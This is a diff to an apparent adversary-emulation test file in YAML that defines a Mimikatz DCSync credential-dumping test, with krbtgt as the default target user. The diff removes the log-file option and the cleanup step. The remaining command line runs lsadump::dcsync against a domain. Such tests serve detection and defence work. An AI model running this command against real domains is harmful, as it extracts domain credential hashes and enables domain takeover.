@@ -19,10 +19,6 @@ atomic_tests:
       description: Targeted user
       type: string
       default: krbtgt
-    output_file:
-      description: Output file
-      type: path
-      default: '%tmp%\mimikatz\x64\mimikatz.log'
     mimikatz_path:
       description: Mimikatz windows executable
       type: path
@@ -44,6 +40,4 @@ atomic_tests:
     name: command_prompt
     elevation_required: false
     command: |
-      #{mimikatz_path} "log #{output_file}" "lsadump::dcsync /domain:#{domain} /user:#{user}@#{domain}" "exit"
-    cleanup_command: |
-      del #{output_file}
+      #{mimikatz_path} "lsadump::dcsync /domain:#{domain} /user:#{user}@#{domain}" "exit"
